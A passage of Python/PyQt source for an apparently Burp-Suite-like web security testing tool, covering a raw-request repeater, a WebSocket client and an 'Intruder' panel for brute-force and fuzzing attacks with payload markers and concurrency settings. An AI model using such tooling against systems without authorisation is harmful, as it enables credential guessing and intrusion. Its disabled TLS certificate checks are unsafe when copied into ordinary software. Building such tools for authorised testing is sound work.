                self.rep_tabs.currentIndex(), n[:28]) if ok and n else None)(
            QInputDialog.getText(tab,"Rename","Name:",
                text=self.rep_tabs.tabText(self.rep_tabs.currentIndex()))))
        dup_btn.clicked.connect(lambda: self._add_rep_tab(
            title=self.rep_tabs.tabText(self.rep_tabs.currentIndex())+" ②",
            method=method_box.currentText(), url=_get_full_url(),
            raw_request=_get_raw()))
        clr_btn.clicked.connect(lambda: (
            [e.clear() for e in [raw_resp,hdrs_resp,body_resp,pretty_resp,hex_resp]],
            render_view.clear(),
            status_lbl.setText("—"), time_lbl.setText(""), size_lbl.setText(""),
            resp_badge.setText(""),
            resp_badge.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO};")))
        copy_url_btn.clicked.connect(lambda: QApplication.clipboard().setText(_get_full_url()))

        # Cancel in-flight
        cancel_btn.clicked.connect(lambda: _state.update({"cancelled": True}))

        # ══ SEND ══
        def _do_send():
            if _state.get("sending"): return
            if not HAS_REQUESTS:
                raw_resp.setPlainText("❌ pip install requests"); return
            full_url = _get_full_url()
            if not full_url.startswith(("http://","https://")):
                raw_resp.setPlainText(
                    "❌ Set the Target field to https://hostname  "
                    "(the path lives in the first line of the editor)"); return

            settings = _state["settings"]
            raw = _get_raw()
            if settings.get("normalize_line_endings", True):
                raw = "\n".join(raw.replace("\r\n", "\n").replace("\r", "\n").split("\n"))
            if settings.get("update_cl", True):
                bb = self._parse_raw_request(raw)[1] or b""
                lines = raw.split("\n")
                blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
                found = False
                for i,l in enumerate(lines[:blank]):
                    if l.lower().startswith("content-length"):
                        lines[i] = f"Content-Length: {len(bb)}"; found = True; break
                if not found and bb: lines.insert(blank, f"Content-Length: {len(bb)}")
                raw = "\n".join(lines)
            hds, bdy = self._parse_raw_request(raw)
            body_b = bdy or b""
            skip = {"transfer-encoding","proxy-connection","te","trailers","upgrade"}
            if settings.get("update_cl", True): skip.add("content-length")
            h = {k2:v2 for k2,v2 in hds.items() if k2.lower() not in skip}
            if settings.get("update_cl", True) and body_b: h["Content-Length"] = str(len(body_b))
            sel_m = method_box.currentText()
            _state["sending"] = True; _state["cancelled"] = False
            send_btn.setEnabled(False); send_btn.setText("  ⏳ ")
            status_lbl.setText("…")

            def _worker():
                import time as _t; t0 = _t.time()
                try:
                    # ── Connection reuse: keep one Session per tab when
                    # enabled (real urllib3 keep-alive pooling); otherwise a
                    # fresh Session forces a brand-new connection every send.
                    reuse = settings.get("http1_reuse", True) or settings.get("http2_reuse", True)
                    if reuse:
                        sess = _state.get("_session")
                        if sess is None:
                            sess = requests.Session(); sess.trust_env = False
                            _state["_session"] = sess
                    else:
                        sess = requests.Session(); sess.trust_env = False

                    allow_alpn = settings.get("allow_alpn_override", False)
                    desired_mode = "alpn_free" if allow_alpn else "force_h1"
                    if (full_url.startswith("https://")
                            and getattr(sess, '_kc_alpn_mode', None) != desired_mode):
                        try:
                            from requests.adapters import HTTPAdapter
                            if desired_mode == "force_h1":
                                from urllib3.util.ssl_ import create_urllib3_context
                                class _H1(HTTPAdapter):
                                    def init_poolmanager(self,*a,**kw):
                                        ctx=create_urllib3_context()
                                        ctx.set_alpn_protocols(["http/1.1"])
                                        # check_hostname must be turned off before
                                        # verify_mode can be relaxed to CERT_NONE —
                                        # doing it in the other order (or not at
                                        # all) raises "Cannot set verify_mode to
                                        # CERT_NONE when check_hostname is enabled"
                                        # on every single HTTPS send in this mode.
                                        ctx.check_hostname = False
                                        ctx.verify_mode = ssl.CERT_NONE
                                        kw["ssl_context"]=ctx
                                        super().init_poolmanager(*a,**kw)
                                sess.mount("https://", _H1())
                            else:
                                sess.mount("https://", HTTPAdapter())
                            sess._kc_alpn_mode = desired_mode
                        except Exception: pass

                    send_headers = dict(h)
                    if allow_alpn and settings.get("strip_connection_h2", True):
                        send_headers = {k2:v2 for k2,v2 in send_headers.items()
                                        if k2.lower() != 'connection'}
                    if not settings.get("unpack_compressed", True):
                        send_headers["Accept-Encoding"] = "identity"

                    read_timeout = settings.get("streaming_timeout", 30)
                    resp = sess.request(sel_m, full_url, headers=send_headers,
                        data=body_b or None, verify=False, timeout=(10, read_timeout),
                        allow_redirects=False, stream=True)

                    redirects = 0
                    if settings.get("follow_redirects", False):
                        cur, cur_url, hop_headers = resp, full_url, dict(send_headers)
                        for _ in range(10):
                            if cur.status_code not in (301,302,303,307,308): break
                            loc = cur.headers.get("Location")
                            if not loc: break
                            cur.close()
                            nxt_url = urljoin(cur_url, loc)
                            if settings.get("enforce_protocol_redirects", False):
                                orig_scheme = urlparse(full_url).scheme
                                p = urlparse(nxt_url)
                                if p.scheme != orig_scheme:
                                    nxt_url = p._replace(scheme=orig_scheme).geturl()
                            if not settings.get("process_cookies_redirects", False):
                                sess.cookies.clear()
                            nxt_method = sel_m
                            hop_body = body_b or None
                            if cur.status_code == 303 or (cur.status_code in (301,302) and sel_m == "POST"):
                                nxt_method = "GET"; hop_body = None
                            this_hop_headers = dict(hop_headers)
                            if hop_body is None:
                                this_hop_headers = {k3:v3 for k3,v3 in this_hop_headers.items()
                                                     if k3.lower() != 'content-length'}
                            cur = sess.request(nxt_method, nxt_url, headers=this_hop_headers,
                                data=hop_body, verify=False, timeout=(10, read_timeout),
                                allow_redirects=False, stream=True)
                            cur_url = nxt_url; redirects += 1
                        resp = cur

                    if settings.get("unpack_compressed", True):
                        rb = resp.content
                    else:
                        try: rb = resp.raw.read(decode_content=False)
                        except Exception: rb = resp.content
                    return resp, rb, _t.time()-t0, None, redirects
                except Exception as ex:
                    return None, b"", _t.time()-t0, str(ex), 0

            def _done(res):
                _state["sending"] = False
                send_btn.setEnabled(True); send_btn.setText("▶  Send")
                if _state.get("cancelled"):
                    raw_resp.setPlainText("⚠ Request cancelled"); return
                resp, rb, elapsed, err, redirects = res
                time_lbl.setText(f"{elapsed*1000:.0f}ms")
                if err:
                    el = err.lower().replace(" ","")
                    if "maxretriesexceeded" in el or "connectionerror" in el:
                        label="ConnErr"; hint=(
                            "Connection failed.\nIf HTTPS_PROXY is set, "
                            "unset it first:\n  unset HTTPS_PROXY HTTP_PROXY\n\n"+err)
                    elif "timeout" in el: label="Timeout"; hint=f"Timed out after {elapsed*1000:.0f}ms\n\n{err}"
                    elif "ssl" in el or "certificate" in el: label="SSLErr"; hint=f"TLS error\n\n{err}"
                    else: label="Err"; hint=err
                    status_lbl.setText(label)
                    status_lbl.setStyleSheet(
                        f"color:{T.RED};font-size:11px;font-family:{T.MONO};font-weight:700;")
                    size_lbl.setText("0 B")
                    resp_badge.setText(f"{label}  {elapsed*1000:.0f}ms")
                    resp_badge.setStyleSheet(
                        f"color:{T.RED};font-size:10px;font-family:{T.MONO};font-weight:700;")
                    raw_resp.setPlainText(f"❌ {label}:\n\n{hint}")
                    self._log(f"[Repeater] {sel_m} {full_url} → {label} ({elapsed*1000:.0f}ms)")
                    return
                sc = resp.status_code; sc_col = status_color(sc)
                status_lbl.setText(str(sc))
                status_lbl.setStyleSheet(
                    f"color:{sc_col};font-size:11px;font-family:{T.MONO};font-weight:700;")
                size_lbl.setText(f"{len(rb):,}B")
                _populate_resp(sc, resp, rb, elapsed)
                hop_note = f", {redirects} redirect(s)" if redirects else ""
                self._log(f"[Repeater] {sel_m} {full_url} → {sc} "
                           f"({elapsed*1000:.0f}ms, {len(rb):,}B{hop_note})")

            future = self._thread_pool.submit(_worker)
            def _poll():
                if future.done():
                    try: _done(future.result())
                    except Exception as ex:
                        _state["sending"] = False; send_btn.setEnabled(True)
                        send_btn.setText("▶  Send")
                        raw_resp.setPlainText(f"❌ Internal error:\n{ex}")
                else: QTimer.singleShot(40, _poll)
            QTimer.singleShot(40, _poll)

        send_btn.clicked.connect(_do_send)

        lbl2 = f"Tab {tab_n}" if title in ("New","Tab 1") else title[:22]
        # Expose live getters on the widget itself so tab-management code
        # (close/reopen/duplicate) can read this tab's current state.
        tab._kc_get_raw = _get_raw
        tab._kc_get_full_url = _get_full_url
        tab._kc_method_box = method_box

        idx2 = self.rep_tabs.addTab(tab, lbl2)
        self.rep_tabs.setCurrentIndex(idx2)
        return tab

    def _add_rep_ws_tab(self, title="WebSocket", url=""):
        """A lightweight WebSocket tab: connect, send/receive text frames,
        live transcript — the Repeater '+' menu's 'New WebSocket tab'."""
        tab = QWidget()
        rv = QVBoxLayout(tab); rv.setContentsMargins(0, 0, 0, 0); rv.setSpacing(0)

        top_bar = QWidget(); top_bar.setFixedHeight(42)
        top_bar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tbl = QHBoxLayout(top_bar); tbl.setContentsMargins(8, 4, 8, 4); tbl.setSpacing(6)

        connect_btn = QPushButton("⚡  Connect"); connect_btn.setStyleSheet(primary_btn_css())
        connect_btn.setFixedHeight(30); connect_btn.setFixedWidth(100)
        disconnect_btn = QPushButton("✕  Disconnect"); disconnect_btn.setFixedHeight(30)
        disconnect_btn.setFixedWidth(110); disconnect_btn.setEnabled(False)
        disconnect_btn.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT2};border:1px solid {T.BORDER};border-radius:6px;")

        url_lbl = QLabel("URL:"); url_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-weight:600;")
        url_edit = QLineEdit(url or "wss://echo.websocket.org")
        url_edit.setFixedHeight(30)
        url_edit.setStyleSheet(
            f"background:{T.SURFACE};color:{T.CODE};border:1px solid {T.BORDER};"
            f"border-radius:6px;padding:0 8px;font-family:{T.MONO};font-size:11px;")

        status_dot = QLabel("●"); status_dot.setStyleSheet(f"color:{T.TXT3};font-size:14px;")
        status_txt = QLabel("Disconnected"); status_txt.setStyleSheet(f"color:{T.TXT3};font-size:11px;")

        tbl.addWidget(connect_btn); tbl.addWidget(disconnect_btn)
        tbl.addWidget(url_lbl); tbl.addWidget(url_edit, 1)
        tbl.addWidget(status_dot); tbl.addWidget(status_txt)
        rv.addWidget(top_bar)

        hdr_lbl = QLabel("Extra handshake headers (optional, one per line):")
        hdr_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;padding:4px 8px 0 8px;")
        rv.addWidget(hdr_lbl)
        hdr_edit = QPlainTextEdit(); hdr_edit.setMaximumHeight(50)
        hdr_edit.setPlaceholderText("Cookie: session=...\nAuthorization: Bearer ...")
        hdr_edit.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;padding:4px 8px;"
            f"font-family:{T.MONO};font-size:10px;")
        rv.addWidget(hdr_edit)

        transcript = QPlainTextEdit(); transcript.setReadOnly(True)
        transcript.setFont(mono_font(10))
        transcript.setStyleSheet(f"background:{T.BG};color:{T.CODE};border:none;padding:8px;")
        rv.addWidget(transcript, 1)

        compose_row = QWidget(); compose_row.setFixedHeight(40)
        compose_row.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};")
        crl = QHBoxLayout(compose_row); crl.setContentsMargins(8, 6, 8, 6); crl.setSpacing(6)
        msg_edit = QLineEdit(); msg_edit.setPlaceholderText("Type a message to send…")
        msg_edit.setFixedHeight(28); msg_edit.setEnabled(False)
        msg_edit.setStyleSheet(
            f"background:{T.SURFACE};color:{T.CODE};border:1px solid {T.BORDER};"
            f"border-radius:6px;padding:0 8px;font-family:{T.MONO};font-size:11px;")
        send_msg_btn = QPushButton("Send"); send_msg_btn.setStyleSheet(primary_btn_css())
        send_msg_btn.setFixedHeight(28); send_msg_btn.setEnabled(False)
        crl.addWidget(msg_edit, 1); crl.addWidget(send_msg_btn)
        rv.addWidget(compose_row)

        client = SimpleWSClient()
        _wstate = {"connected": False}

        def _append(direction, text):
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            arrow = {"sent": "→", "recv": "←", "info": "·", "error": "✕"}.get(direction, "·")
            transcript.appendPlainText(f"[{ts}] {arrow} {text}")

        def _on_message(direction, text):
            _append(direction, text)
            if direction == "info" and "Connected" in text:
                _wstate["connected"] = True
                status_dot.setStyleSheet(f"color:{T.GREEN};font-size:14px;")
                status_txt.setText("Connected"); status_txt.setStyleSheet(f"color:{T.GREEN};font-size:11px;")
                connect_btn.setEnabled(False); disconnect_btn.setEnabled(True)
                msg_edit.setEnabled(True); send_msg_btn.setEnabled(True)
            elif direction == "error":
                status_dot.setStyleSheet(f"color:{T.RED};font-size:14px;")
                status_txt.setText("Error"); status_txt.setStyleSheet(f"color:{T.RED};font-size:11px;")

        def _on_closed():
            _wstate["connected"] = False
            status_dot.setStyleSheet(f"color:{T.TXT3};font-size:14px;")
            status_txt.setText("Disconnected"); status_txt.setStyleSheet(f"color:{T.TXT3};font-size:11px;")
            connect_btn.setEnabled(True); disconnect_btn.setEnabled(False)
            msg_edit.setEnabled(False); send_msg_btn.setEnabled(False)

        client.message.connect(_on_message)
        client.closed.connect(_on_closed)

        def _do_connect():
            transcript.clear()
            status_txt.setText("Connecting…")
            self._thread_pool.submit(client.connect_to, url_edit.text().strip(), hdr_edit.toPlainText())

        def _do_disconnect():
            self._thread_pool.submit(client.disconnect)

        def _do_send_msg():
            txt = msg_edit.text()
            if not txt or not _wstate["connected"]: return
            self._thread_pool.submit(client.send_text, txt)
            msg_edit.clear()

        connect_btn.clicked.connect(_do_connect)
        disconnect_btn.clicked.connect(_do_disconnect)
        send_msg_btn.clicked.connect(_do_send_msg)
        msg_edit.returnPressed.connect(_do_send_msg)

        tab._kc_is_ws = True
        tab._kc_ws_url = url_edit

        lbl2 = f"⚡ {title[:20]}"
        idx2 = self.rep_tabs.addTab(tab, lbl2)
        self.rep_tabs.setCurrentIndex(idx2)
        return tab

    def _intruder_tab(self):
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(8, 8, 8, 8)
        root.setSpacing(6)

        # ── Top bar: attack type + target ─────────────────────────────
        top = QHBoxLayout()
        mode_g = QGroupBox("Attack Type")
        mode_l = QVBoxLayout(mode_g)
        self.intr_mode = QComboBox()
        self.intr_mode.addItems([IntruderAttack.SNIPER, IntruderAttack.BATTERING,
                                 IntruderAttack.PITCHFORK, IntruderAttack.CLUSTER_BOMB])
        self.intr_mode.currentTextChanged.connect(self._on_intr_mode_change)
        mode_l.addWidget(self.intr_mode)
        self.mode_desc = QLabel()
        self.mode_desc.setWordWrap(True)
        self.mode_desc.setStyleSheet(f"color: {T.TXT2}; font-size: 11px; padding: 4px")
        mode_l.addWidget(self.mode_desc)
        top.addWidget(mode_g, 1)

        tg = QGroupBox("Target")
        tgl = QFormLayout(tg)
        self.intr_method = QComboBox()
        self.intr_method.addItems(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
        self.intr_url = QLineEdit()
        self.intr_url.setPlaceholderText("https://target.com/login")
        tgl.addRow("Method:", self.intr_method)
        tgl.addRow("URL:", self.intr_url)
        top.addWidget(tg, 2)
        root.addLayout(top)

        # ── Main split: request editor (left) | side panel (right) ─────
        mid_sp = QSplitter(Qt.Orientation.Horizontal)
        root.addWidget(mid_sp, 1)

        bw = QWidget()
        bv = QVBoxLayout(bw)
        bv.setContentsMargins(0, 0, 0, 0)

        # Position-marking toolbar (Burp-style)
        pos_tb = QHBoxLayout()
        pos_tb.setContentsMargins(0, 0, 0, 4)
        self.intr_add_marker_btn = self._btn("➕ Add §", h=26)
        self.intr_add_marker_btn.setToolTip("Wrap the selected text (or cursor position) in § markers")
        self.intr_clear_marker_btn = self._btn("🧹 Clear §", h=26)
        self.intr_clear_marker_btn.setToolTip("Remove all § markers from Headers and Body")
        self.intr_auto_marker_btn = self._btn("🎯 Auto §", h=26)
        self.intr_auto_marker_btn.setToolTip("Auto-detect parameter values in Headers and Body and mark them")
        pos_tb.addWidget(self.intr_add_marker_btn)
        pos_tb.addWidget(self.intr_clear_marker_btn)
        pos_tb.addWidget(self.intr_auto_marker_btn)
        pos_tb.addStretch(1)
        self.intr_marker_count_lbl = QLabel("0 positions")
        self.intr_marker_count_lbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;font-weight:600;padding-right:4px")
        pos_tb.addWidget(self.intr_marker_count_lbl)
        bv.addLayout(pos_tb)

        lbl_h = QLabel("Headers (optional):")
        lbl_h.setStyleSheet(f"color: {T.TXT2}; font-size: 11px")
        bv.addWidget(lbl_h)
        self.intr_headers = QPlainTextEdit()
        self.intr_headers.setMaximumHeight(80)
        self.intr_headers.setFont(mono_font(10))
        self.intr_headers.setPlaceholderText("Content-Type: application/json\nCookie: session=abc")
        self.intr_headers.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.intr_headers.customContextMenuRequested.connect(
            lambda pos: self._intr_editor_ctx(self.intr_headers, pos))
        self.intr_headers.textChanged.connect(self._intr_update_marker_count)
        IntruderMarkerHighlighter(self.intr_headers.document())
        bv.addWidget(self.intr_headers)
        lbl_b = QLabel("Request Body (mark injection points with § — e.g. §PAYLOAD§):")
        lbl_b.setStyleSheet(f"color: {T.TXT2}; font-size: 11px")
        bv.addWidget(lbl_b)
        self.intr_body = QPlainTextEdit()
        self.intr_body.setFont(mono_font(10))
        self.intr_body.setPlaceholderText('username=admin&password=§PAYLOAD§\n\nJSON:\n{"user":"admin","pass":"§PAYLOAD§"}')
        HTTPHighlighter(self.intr_body.document())
        IntruderMarkerHighlighter(self.intr_body.document())
        self.intr_body.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.intr_body.customContextMenuRequested.connect(
            lambda pos: self._intr_editor_ctx(self.intr_body, pos))
        self.intr_body.textChanged.connect(self._intr_update_marker_count)
        bv.addWidget(self.intr_body)
        mid_sp.addWidget(bw)

        self._intr_active_editor = self.intr_body
        QApplication.instance().focusChanged.connect(self._on_intr_focus_changed)
        self.intr_add_marker_btn.clicked.connect(self._intr_add_marker)
        self.intr_clear_marker_btn.clicked.connect(self._intr_clear_markers)
        self.intr_auto_marker_btn.clicked.connect(self._intr_auto_markers)

        # ── Right side panel: Payloads / Resource Pool / Settings ───────
        # (mirrors Burp's vertical icon strip on the right edge of Intruder)
        side = QTabWidget()
        side.setTabPosition(QTabWidget.TabPosition.East)
        side.setStyleSheet(
            f"QTabWidget::pane{{border-left:1px solid {T.BORDER};background:{T.PANEL};}}"
            f"QTabBar::tab{{background:{T.SURFACE};color:{T.TXT2};padding:10px 6px;"
            f"margin:2px 0;border:1px solid {T.BORDER};border-radius:4px;"
            f"font-size:11px;font-weight:600;}}"
            f"QTabBar::tab:selected{{background:{T.BLUE};color:{T.ON_ACCENT};border-color:{T.BLUE};}}"
            f"QTabBar::tab:hover:!selected{{border-color:{T.BLUE};}}")
        side.addTab(self._intr_payloads_panel(), "§ Payloads")
        side.addTab(self._intr_resourcepool_panel(), "⏱ Pool")
        side.addTab(self._intr_settings_panel(), "⚙ Settings")
        mid_sp.addWidget(side)
        mid_sp.setSizes([720, 400])

        # ── Bottom: Start/Stop + progress + View Results ────────────────
        ah = QHBoxLayout()
        self.intr_start = self._btn("⚡ Start Attack", "purple", h=34)
        self.intr_stop = self._btn("⏹ Stop", "danger", h=34)
        self.intr_stop.setEnabled(False)
        self.intr_view_results_btn = self._btn("📊 View Results", h=34)
        self.intr_view_results_btn.setEnabled(False)
        ah.addWidget(self.intr_start)
        ah.addWidget(self.intr_stop)
        ah.addWidget(self.intr_view_results_btn)
        self.intr_prog = QProgressBar()
        self.intr_prog.setVisible(False)
        ah.addWidget(self.intr_prog, 1)
        self.intr_status_lbl = QLabel("")
        self.intr_status_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO}")
        ah.addWidget(self.intr_status_lbl)
        root.addLayout(ah)

        # ── State ────────────────────────────────────────────────────────
        self._intr_payload_sets: Dict[int, dict] = {}
        self._intr_current_pos = 0
        self._intr_result_dialogs = []
        self._intr_active_dialog = None
        self._intr_attack_counter = 0

        self.intr_start.clicked.connect(self._start_intruder)
        self.intr_stop.clicked.connect(self._stop_intruder)
        self.intr_view_results_btn.clicked.connect(self._intr_show_active_dialog)
        self._on_intr_mode_change(IntruderAttack.SNIPER)
        self._intr_update_marker_count()
        return w

    # ---------- Intruder: side panel builders ----------
    def _intr_section_label(self, text: str) -> QLabel:
        lbl = QLabel(text)
        lbl.setStyleSheet(
            f"color:{T.TXT1};font-size:11px;font-weight:700;"
            f"padding-top:8px;border-top:1px solid {T.BORDER};margin-top:2px")
        return lbl

    def _make_collapsible(self, title: str, content: QWidget, expanded: bool = True, icon: str = ""):
        """Burp-Inspector-style collapsible section: header with a live count
        badge + chevron, click to expand/collapse the content widget below.
        Returns (container_widget, set_count(n) callable) so callers can
        update the badge as the underlying data changes."""
        box = QWidget()
        bl = QVBoxLayout(box); bl.setContentsMargins(0, 0, 0, 0); bl.setSpacing(0)
        label = f"  {icon}  {title}" if icon else f"  {title}"

        header = QToolButton()
        header.setCheckable(True); header.setChecked(expanded)
        header.setToolButtonStyle(Qt.ToolButtonStyle.ToolButtonTextBesideIcon)
        header.setArrowType(Qt.ArrowType.DownArrow if expanded else Qt.ArrowType.RightArrow)
        header.setText(label)
        header.setStyleSheet(
            f"QToolButton{{background:{T.SURFACE};color:{T.TXT1};border:none;"
            f"border-bottom:1px solid {T.BORDER};padding:7px 8px;font-size:11px;"
            f"font-weight:700;text-align:left;}}"
            f"QToolButton:hover{{background:{T.GLOW};}}")

        content.setVisible(expanded)

        def _toggle(checked):
            header.setArrowType(Qt.ArrowType.DownArrow if checked else Qt.ArrowType.RightArrow)
            content.setVisible(checked)
        header.toggled.connect(_toggle)

        bl.addWidget(header)
        bl.addWidget(content)

        def _set_count(n: int):
            header.setText(label + (f"   ·  {n}" if n else ""))

        return box, _set_count

    def _intr_payloads_panel(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(10, 10, 10, 10)
        v.setSpacing(6)

        # Payload set / position selector — only meaningful for Pitchfork
        # and Cluster Bomb (Sniper/Battering Ram always use set 1).
        self.intr_pos_row = QWidget()
        pr = QHBoxLayout(self.intr_pos_row)
        pr.setContentsMargins(0, 0, 0, 0)
        pr.addWidget(QLabel("Payload set:"))
        self.intr_pos_combo = QComboBox()
        self.intr_pos_combo.currentIndexChanged.connect(self._intr_position_changed)
        pr.addWidget(self.intr_pos_combo, 1)
        v.addWidget(self.intr_pos_row)

        # Payload type
        pt = QHBoxLayout()
        pt.addWidget(QLabel("Payload type:"))
        self.intr_ptype = QComboBox()
        self.intr_ptype.addItems(INTRUDER_PAYLOAD_TYPES)
        self.intr_ptype.currentTextChanged.connect(self._intr_ptype_changed)
        pt.addWidget(self.intr_ptype, 1)
        v.addLayout(pt)

        # Dynamic type-specific configuration (Numbers, Dates, Brute forcer,
        # Character substitution, etc.) — hidden for "Simple list".
        v.addWidget(self._intr_section_label("Payload type configuration"))
        self.intr_ptype_config_box = QWidget()
        self.intr_ptype_config_layout = QVBoxLayout(self.intr_ptype_config_box)
        self.intr_ptype_config_layout.setContentsMargins(0, 2, 0, 2)
        self.intr_ptype_config_layout.setSpacing(4)
        v.addWidget(self.intr_ptype_config_box)
        self._intr_ptype_fields: Dict[str, QWidget] = {}
        self.intr_generate_btn = self._btn("⚙  Generate payload list", "primary", h=26)
        self.intr_generate_btn.clicked.connect(self._intr_generate_from_type)
        self.intr_generate_btn.setVisible(False)
        v.addWidget(self.intr_generate_btn)

        # Live counts
        cnt_row = QHBoxLayout()
        self.intr_payload_count_lbl = QLabel("Payload count: 0")
        self.intr_request_count_lbl = QLabel("Request count: 0")
        for lb in (self.intr_payload_count_lbl, self.intr_request_count_lbl):
            lb.setStyleSheet(f"color:{T.TXT2};font-size:11px;font-family:{T.MONO}")
        cnt_row.addWidget(self.intr_payload_count_lbl)
        cnt_row.addWidget(self.intr_request_count_lbl)
        cnt_row.addStretch()
        v.addLayout(cnt_row)

        v.addWidget(self._intr_section_label("Payload list"))
        self.intr_payload_list = QListWidget()
        self.intr_payload_list.setEditTriggers(QAbstractItemView.EditTrigger.DoubleClicked)
        self.intr_payload_list.setFont(mono_font(10))
        self.intr_payload_list.setSelectionMode(QAbstractItemView.SelectionMode.ExtendedSelection)
        self.intr_payload_list.setMaximumHeight(150)
        v.addWidget(self.intr_payload_list)

        row1 = QHBoxLayout()
        b_paste = self._btn("Paste", h=24)
        b_load = self._btn("Load…", h=24)
        b_rm = self._btn("Remove", h=24)
        b_clr = self._btn("Clear", h=24)
        b_dedup = self._btn("Dedup", h=24)
        for b in (b_paste, b_load, b_rm, b_clr, b_dedup):
            row1.addWidget(b)
        v.addLayout(row1)

        row2 = QHBoxLayout()
        self.intr_add_item_edit = QLineEdit()
        self.intr_add_item_edit.setPlaceholderText("Enter a new item…")
        self.intr_add_item_edit.setFixedHeight(26)
        b_add_item = self._btn("Add", "primary", h=26)
        row2.addWidget(self.intr_add_item_edit, 1)
        row2.addWidget(b_add_item)
        v.addLayout(row2)

        row3 = QHBoxLayout()
        row3.addWidget(QLabel("Add from list:"))
        self.intr_addlist_combo = QComboBox()
        self.intr_addlist_combo.addItems(list(Payloads.categories().keys()))
        b_addlist = self._btn("Add", h=24)
        b_addlist.clicked.connect(self._intr_add_from_preset_list)
        row3.addWidget(self.intr_addlist_combo, 1)
        row3.addWidget(b_addlist)
        v.addLayout(row3)

        b_paste.clicked.connect(self._intr_paste_payloads)
        b_load.clicked.connect(self._intr_load_payloads_file)
        b_rm.clicked.connect(self._intr_remove_selected_payloads)
        b_clr.clicked.connect(self._intr_clear_payloads)
        b_dedup.clicked.connect(self._intr_dedupe_payloads)
        b_add_item.clicked.connect(self._intr_add_single_payload)
        self.intr_add_item_edit.returnPressed.connect(self._intr_add_single_payload)

        v.addWidget(self._intr_section_label("Payload processing"))
        self.intr_rules_tbl = QTableWidget(0, 2)
        self.intr_rules_tbl.setHorizontalHeaderLabels(["On", "Rule"])
        self.intr_rules_tbl.horizontalHeader().setStretchLastSection(True)
        self.intr_rules_tbl.setColumnWidth(0, 34)
        self.intr_rules_tbl.setMaximumHeight(100)
        self.intr_rules_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.intr_rules_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        v.addWidget(self.intr_rules_tbl)

        row3 = QHBoxLayout()
        b_radd = self._btn("Add", h=24)
        b_redit = self._btn("Edit", h=24)
        b_rrm = self._btn("Remove", h=24)
        b_rup = self._btn("↑", h=24, w=30)
        b_rdn = self._btn("↓", h=24, w=30)
        for b in (b_radd, b_redit, b_rrm, b_rup, b_rdn):
            row3.addWidget(b)
        v.addLayout(row3)
        b_radd.clicked.connect(self._intr_add_rule)
        b_redit.clicked.connect(self._intr_edit_rule)
        b_rrm.clicked.connect(self._intr_remove_rule)
        b_rup.clicked.connect(lambda: self._intr_move_rule(-1))
        b_rdn.clicked.connect(lambda: self._intr_move_rule(1))

        v.addWidget(self._intr_section_label("Payload encoding"))
        enc_row = QHBoxLayout()
        self.intr_encode_chk = QCheckBox("URL-encode:")
        self.intr_encode_chars = QLineEdit(' %&+?#"\'<>')
        self.intr_encode_chars.setFixedHeight(24)
        self.intr_encode_chars.setToolTip("Characters to percent-encode in every payload before it's inserted")
        enc_row.addWidget(self.intr_encode_chk)
        enc_row.addWidget(self.intr_encode_chars, 1)
        v.addLayout(enc_row)

        v.addStretch()
        self._intr_ptype_changed(self.intr_ptype.currentText())
        return w

    def _intr_resourcepool_panel(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(10, 10, 10, 10)
        v.setSpacing(6)

        v.addWidget(self._intr_section_label("Concurrency"))
        f1 = QFormLayout()
        self.intr_conc = QSpinBox()
        self.intr_conc.setRange(1, 50)
        self.intr_conc.setValue(10)
        f1.addRow("Concurrent requests:", self.intr_conc)
        v.addLayout(f1)

        v.addWidget(self._intr_section_label("Delay between requests"))
        self.intr_delay_fixed_rb = QRadioButton("Fixed delay")
        self.intr_delay_jitter_rb = QRadioButton("Fixed + random variation")
        self.intr_delay_fixed_rb.setChecked(True)
        v.addWidget(self.intr_delay_fixed_rb)
        f2 = QFormLayout()
        self.intr_delay = QSpinBox()
        self.intr_delay.setRange(0, 60000)
        self.intr_delay.setSuffix(" ms")
        f2.addRow("Delay:", self.intr_delay)
        v.addLayout(f2)
        v.addWidget(self.intr_delay_jitter_rb)
        f3 = QFormLayout()
        self.intr_delay_jitter = QSpinBox()
        self.intr_delay_jitter.setRange(0, 60000)
        self.intr_delay_jitter.setSuffix(" ms")
        f3.addRow("Up to extra:", self.intr_delay_jitter)
        v.addLayout(f3)

        v.addWidget(self._intr_section_label("Automatic throttling"))
        self.intr_throttle_429 = QCheckBox("Back off on HTTP 429 (Too Many Requests)")
        self.intr_throttle_503 = QCheckBox("Back off on HTTP 503 (Service Unavailable)")
        v.addWidget(self.intr_throttle_429)
        v.addWidget(self.intr_throttle_503)
        f4 = QFormLayout()
        self.intr_throttle_other = QLineEdit()
        self.intr_throttle_other.setPlaceholderText("e.g. 504,509")
        f4.addRow("Other codes (CSV):", self.intr_throttle_other)
        self.intr_throttle_extra = QSpinBox()
        self.intr_throttle_extra.setRange(0, 60000)
        self.intr_throttle_extra.setSuffix(" ms")
        self.intr_throttle_extra.setValue(2000)
        f4.addRow("Extra delay when throttled:", self.intr_throttle_extra)
        v.addLayout(f4)

        v.addStretch()
        return w

    def _intr_settings_panel(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(10, 10, 10, 10)
        v.setSpacing(6)

        v.addWidget(self._intr_section_label("Request headers"))
        self.intr_update_cl_chk = QCheckBox("Update Content-Length header")
        self.intr_update_cl_chk.setChecked(True)
        self.intr_set_conn_chk = QCheckBox("Set Connection: close header")
        v.addWidget(self.intr_update_cl_chk)
        v.addWidget(self.intr_set_conn_chk)

        v.addWidget(self._intr_section_label("Error handling"))
